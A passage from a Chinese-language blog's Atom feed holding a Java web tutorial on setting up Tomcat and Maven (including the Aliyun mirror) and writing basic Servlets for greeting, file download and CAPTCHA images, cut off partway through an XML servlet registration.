<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>V0W&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/1914f553830167cb3aa7ec868754a4ce</icon>
  <subtitle>仰望01世界，徜徉赛博空间。</subtitle>
  <link href="http://v0w.top/atom.xml" rel="self"/>
  
  <link href="http://v0w.top/"/>
  <updated>2020-12-31T08:55:48.444Z</updated>
  <id>http://v0w.top/</id>
  
  <author>
    <name>V0WKeep3r</name>
    <email>v0wldl@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JavaWeb笔记</title>
    <link href="http://v0w.top/2020/12/30/JavaWebNote/"/>
    <id>http://v0w.top/2020/12/30/JavaWebNote/</id>
    <published>2020-12-29T16:00:00.000Z</published>
    <updated>2020-12-31T08:55:48.444Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-tomcat"><a href="#0x01-tomcat" class="headerlink" title="0x01 tomcat"></a>0x01 tomcat</h1><p>tomcat是一个服务器中间件，用于运行java web的服务程序，特点是轻量级，适合初学者进行部署和学习。</p><h2 id="1-1-下载tomcat"><a href="#1-1-下载tomcat" class="headerlink" title="1.1 下载tomcat"></a>1.1 下载tomcat</h2><p>官网：<a href="https://tomcat.apache.org/">https://tomcat.apache.org/</a></p><p>可以选择不同的版本，复现一些特殊的漏洞，可能依赖不同的tomcat版本。如果直接不能下载相应版本，我们可以通过<br><a href="https://tomcat.apache.org/download-70.cgi">https://tomcat.apache.org/download-70.cgi</a> 下载7版本的tomcat。可以在archive下选择不同的小版本。<br>开发的话，一般选择最新即可。</p><h2 id="1-2-配置tomcat"><a href="#1-2-配置tomcat" class="headerlink" title="1.2 配置tomcat"></a>1.2 配置tomcat</h2><p>如果是使用IDEA等IDE进行java编写和部署，一般不需要单独把tomcat配置环境变量。如果需要的话，可以按照这样的步骤进行配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打开终端，输入：</span><br><span class="line">open .bash_profile</span><br><span class="line"></span><br><span class="line">打开.bash_profile，编辑，插入如下语句（当然你也可以用vim编辑）:</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;Users&#x2F;v0w&#x2F;Environment&#x2F;tomcat&#x2F;apache-tomcat-9.0.41&#x2F;bin</span><br><span class="line"></span><br><span class="line">其中&#x2F;Users&#x2F;v0w&#x2F;Environment&#x2F;tomcat&#x2F;apache-tomcat-9.0.41&#x2F;bin是路径名，对应自己的路径名即可。</span><br><span class="line"></span><br><span class="line">然后保存关闭。再在终端执行：</span><br><span class="line">source ～&#x2F;.bash_profile</span><br><span class="line"></span><br><span class="line">此时你可以在终端尝试如下命令启动tomcat服务：</span><br><span class="line">startup.sh</span><br><span class="line">version.sh</span><br></pre></td></tr></table></figure><p><img src="https://image.v0w.top/2020/12/16079550000910.jpg"></p><p><strong>配置文件</strong><br>tomcat的配置文件是<code>/conf/server.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--通过设置这里的port，更改java web的服务端口--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过修改这里的name，设置不同的hostname--&gt;</span>          </span><br><span class="line">      <span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span>  <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>tomcat的默认javaweb应用的配置文件是<code>/conf/web.xml</code><br>用来配置javaweb的路由，过滤器等，<br>当然，在存在<code>/webapps/ROOT/WEB-INF/web.xml</code>时，以此为webapps的<code>web.xml</code>为优先的web配置。<br><img src="https://image.v0w.top/2020/12/16079561796429.jpg"></p><h1 id="0x02-Maven"><a href="#0x02-Maven" class="headerlink" title="0x02 Maven"></a>0x02 Maven</h1><p>一个javaWeb项目在开发过程中，可能需要使用很多的jar包，需要开发者自行导入，这样的话，非常繁琐复杂。Maven工具可以帮助我们自动的导入jar包。</p><h2 id="2-1-下载Maven"><a href="#2-1-下载Maven" class="headerlink" title="2.1 下载Maven"></a>2.1 下载Maven</h2><p>打开Maven官网下载页面: <a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a><br>下载: <code>apache-maven-3.6.3-bin.tar.gz</code><br>解压下载的安装包到某一目录，比如：<code>/Users/xxx/Environment/apache-maven-3.6.3</code></p><h2 id="2-2-配置环境变量"><a href="#2-2-配置环境变量" class="headerlink" title="2.2 配置环境变量"></a>2.2 配置环境变量</h2><p>打开terminel输入以下命令： <code>vim ~/.bash_profile</code> 打开<code>.bash_profile</code>文件，在此文件中添加设置环境变量的命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export M2_HOME&#x3D;&quot;&#x2F;Users&#x2F;v0w&#x2F;Environment&#x2F;apache-maven-3.6.3&quot;</span><br><span class="line">export PATH&#x3D;$PATH:$M2_HOME&#x2F;bin</span><br></pre></td></tr></table></figure><p>添加之后保存并，执行以下命令使配置生效：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;.bash_profile</span><br></pre></td></tr></table></figure><p>查看配置是否生效<code>mvn -v</code></p><h2 id="2-3-配置阿里云镜像"><a href="#2-3-配置阿里云镜像" class="headerlink" title="2.3 配置阿里云镜像"></a>2.3 配置阿里云镜像</h2><p>国内最好的maven repository<br>第一步:修改maven根目录下的conf文件夹中的setting.xml文件，内容如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二步: pom.xml文件里添加</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">releases</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">releases</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure><p>建立本地仓库</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>/Users/v0w/Environment/apache-maven-3.6.3/maven-repo<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-4-IDEA下使用Maven"><a href="#2-4-IDEA下使用Maven" class="headerlink" title="2.4 IDEA下使用Maven"></a>2.4 IDEA下使用Maven</h2><p><img src="https://image.v0w.top/2020/12/16079443404504.jpg" alt="新建Maven"></p><p>在IDEA中的配置：<br><img src="https://image.v0w.top/2020/12/16079490698552.jpg" alt="Maven配置"></p><p>使用<code>archtype</code>时，创建的<code>webapp maven</code>项目：<br><img src="https://image.v0w.top/2020/12/16079494270820.jpg" alt="webapp Maven"></p><p>不使用<code>archtype</code>时，创建的默认的maven项目：<br><img src="https://image.v0w.top/2020/12/16079492213801.jpg" alt="默认maven"></p><h2 id="2-5-IDEA-配置tomcat"><a href="#2-5-IDEA-配置tomcat" class="headerlink" title="2.5 IDEA 配置tomcat"></a>2.5 IDEA 配置tomcat</h2><p><img src="https://image.v0w.top/2020/12/16079983699922.jpg" alt="add configuration"></p><p><img src="https://image.v0w.top/2020/12/16079988426282.jpg" alt="tomcat详细配置"></p><p><strong>为什么会有这个问题：我们访问一个网站需要指定一个文件夹名称</strong></p><p>解决警告问题。<br><img src="https://image.v0w.top/2020/12/16079989885435.jpg" alt="解决警告问题"></p><p>tomcat虚拟访问路径的配置<br><img src="https://image.v0w.top/2020/12/16079992796791.jpg"></p><h2 id="2-6-pom-xml文件"><a href="#2-6-pom-xml文件" class="headerlink" title="2.6 pom.xml文件"></a>2.6 pom.xml文件</h2><p>pom.xml是maven的核心配置文件：<br>pom.xml文件结构和各部分功能如下：<br><img src="https://image.v0w.top/2020/12/16080025480781.jpg" alt="pom.xml文件结构"></p><p>对于dependency，可以体现maven的高级之处：不仅会导入dependecy中明确配置的jar包，还会自动导入其依赖的其他jar包。</p><p>maven由于<strong>约定大于配置</strong>的性质，之后我们写的配置文件可能存在无法导出或者无法生效的问题。</p><p>解决方案：<br>配置resources，防止资源导出失败问题：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--在build中配置resources，防止资源导出失败问题--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x03-Servlet"><a href="#0x03-Servlet" class="headerlink" title="0x03 Servlet"></a>0x03 Servlet</h1><h2 id="3-1-Servlet-简介"><a href="#3-1-Servlet-简介" class="headerlink" title="3.1 Servlet 简介"></a>3.1 Servlet 简介</h2><ul><li>Servlet是sun公司开发动态web的技术</li><li>Servlet是一个接口，想开发一个动态web程序，分为两步：<ol><li>编写一个java类，实现Servlet接口</li><li>将编写好的java程序部署到tomcat服务器中</li></ol></li></ul><p><strong>我们把实现了Servlet接口的应用程序成为Servlet</strong><br>Servlet接口有两个默认的实现类：</p><ul><li>GenericServlet</li><li>HttpServlet<br>继承接口如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">op1&#x3D;&gt;operation: Servlet接口</span><br><span class="line">op2&#x3D;&gt;operation: GenericServlet类</span><br><span class="line">op3&#x3D;&gt;operation: HttpServlet类</span><br><span class="line">op1-&gt;op2-&gt;op3</span><br></pre></td></tr></table></figure><h2 id="3-2-HelloServlet"><a href="#3-2-HelloServlet" class="headerlink" title="3.2 HelloServlet"></a>3.2 HelloServlet</h2><p><strong>1、 新建工程，使用Maven并优化</strong><br>优化Maven：<br>增加目录：resources + java<br>将web.xml修改成最新版的web.xml<br>最新的web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">                  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">metadata-complete</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span> &gt;</span></span><br></pre></td></tr></table></figure><p><strong>2、编写Servlet</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        super.doGet(req, resp);</span></span><br><span class="line">        PrintWriter writer = resp.getWriter();  <span class="comment">// 响应流</span></span><br><span class="line">        writer.println(<span class="string">&quot;Hello, Servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        super.doPost(req, resp);</span></span><br><span class="line">            doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3、编写映射</strong><br>为什么需要映射：我们写的是java程序，浏览器需要连接web服务器，我们需要在web服务器注册写的servlet，并且给浏览器一个可以访问的路径。</p><p>在web.xml中增加servlet的注册和路径映射</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  注册selevet  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>top.v0w.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  servlet路径映射  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>4、访问测试</strong><br><img src="https://image.v0w.top/2020/12/16080063630398.jpg" alt="测试成功"></p><h2 id="3-3-Servlet原理"><a href="#3-3-Servlet原理" class="headerlink" title="3.3 Servlet原理"></a>3.3 Servlet原理</h2><p><img src="https://image.v0w.top/2020/12/16080069532323.jpg" alt="Servlet运行流程"></p><h2 id="3-4-Mapping问题"><a href="#3-4-Mapping问题" class="headerlink" title="3.4 Mapping问题"></a>3.4 Mapping问题</h2><ul><li>一个Servlet可以映射多个路径</li><li>可以使用通配符进行映射<code>&lt;url-pattern&gt;/hello/*&lt;/url-pattern&gt;</code></li><li>可以自定义后缀</li></ul><h2 id="3-5-ServletContext"><a href="#3-5-ServletContext" class="headerlink" title="3.5 ServletContext"></a>3.5 ServletContext</h2><p>web容器在启动的时候，会为每个Servlet创建一个ServletContext对象，它代表当前的web应用。</p><ul><li>共享数据：多个Servlet之间进行通信等</li><li>请求转发</li><li>获取初始化参数</li><li>读取配置文件</li></ul><p>这里补充一下请求转发和重定向的区别：<br><img src="https://image.v0w.top/2020/12/16087067508081.jpg" alt="请求转发和重定向"></p><h2 id="3-6-HttpServletRequest"><a href="#3-6-HttpServletRequest" class="headerlink" title="3.6 HttpServletRequest"></a>3.6 HttpServletRequest</h2><ul><li>获取前端传递的参数</li><li>请求转发</li></ul><h3 id="3-6-1-获取请求参数"><a href="#3-6-1-获取请求参数" class="headerlink" title="3.6.1 获取请求参数"></a>3.6.1 获取请求参数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">req.getParameterValues(<span class="string">&quot;hobbies&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-6-2-请求转发"><a href="#3-6-2-请求转发" class="headerlink" title="3.6.2 请求转发"></a>3.6.2 请求转发</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">req.getRequestDispatcher(<span class="string">&quot;/sucess.jsp&quot;</span>).forward(req,resp);</span><br></pre></td></tr></table></figure><h2 id="3-7-HttpServletResponse"><a href="#3-7-HttpServletResponse" class="headerlink" title="3.7 HttpServletResponse"></a>3.7 HttpServletResponse</h2><p>应用：</p><ul><li>向浏览器输出信息</li><li>下载文件</li><li>生成验证码</li><li>实现重定向</li></ul><h3 id="3-7-1-下载文件"><a href="#3-7-1-下载文件" class="headerlink" title="3.7.1 下载文件"></a>3.7.1 下载文件</h3><p>编写Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//1. 获取文件的下载路径</span></span><br><span class="line">        String realPath = <span class="string">&quot;/Users/v0w/Desktop/test.jpg&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;path: &quot;</span>+realPath);</span><br><span class="line"><span class="comment">//2. 下载文件的文件名</span></span><br><span class="line">        String filename = realPath.substring(realPath.lastIndexOf(<span class="string">&quot;/&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="comment">//3. setHeaders是浏览器支持下载的数据类型</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span>+ URLEncoder.encode(filename, <span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line"><span class="comment">//4. 获取下载文件的输入流</span></span><br><span class="line">        FileInputStream in = <span class="keyword">new</span> FileInputStream(realPath);</span><br><span class="line"><span class="comment">//5. 获取缓冲区</span></span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">//6. OutputStream</span></span><br><span class="line">        ServletOutputStream out = resp.getOutputStream();</span><br><span class="line"><span class="comment">//7. FileInputStream into buffer, buffer into client through ServletOutputStream</span></span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer,<span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册Servlet</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>download<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>top.v0w.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>download<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/down<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-7-2-验证码"><a href="#3-7-2-验证码" class="headerlink" title="3.7.2 验证码"></a>3.7.2 验证码</h3><p>验证码Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImageServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 浏览器自动刷新</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//内存中创建一个图片</span></span><br><span class="line">        BufferedImage image = <span class="keyword">new</span> BufferedImage(<span class="number">80</span>, <span class="number">20</span>, BufferedImage.TYPE_INT_RGB);</span><br><span class="line">        <span class="comment">// 得到图片</span></span><br><span class="line">        Graphics2D g = (Graphics2D) image.getGraphics();    <span class="comment">//类似画笔</span></span><br><span class="line">        <span class="comment">// 设置图片背景颜色</span></span><br><span class="line">        g.setBackground(Color.white);</span><br><span class="line">        g.fillRect(<span class="number">0</span>,<span class="number">0</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="comment">// 给图片写数据</span></span><br><span class="line">        g.setColor(Color.blue);</span><br><span class="line">        g.setFont(<span class="keyword">new</span> Font(<span class="string">&quot;aa&quot;</span>,Font.BOLD,<span class="number">20</span>));</span><br><span class="line">        g.drawString(makeRandom(),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//告诉浏览器格式，如何打开</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;image/jpg&quot;</span>);</span><br><span class="line">        resp.setDateHeader(<span class="string">&quot;expires&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Cache-Control&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Pragma&quot;</span>,<span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ImageIO.write(image,<span class="string">&quot;jpg&quot;</span>,resp.getOutputStream());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">makeRandom</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        String num =  random.nextInt(<span class="number">999999</span>)+<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//处理009999这种情况</span></span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>-num.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(num);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册Servlet</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>img<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>top.v0w.servlet.ImageServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 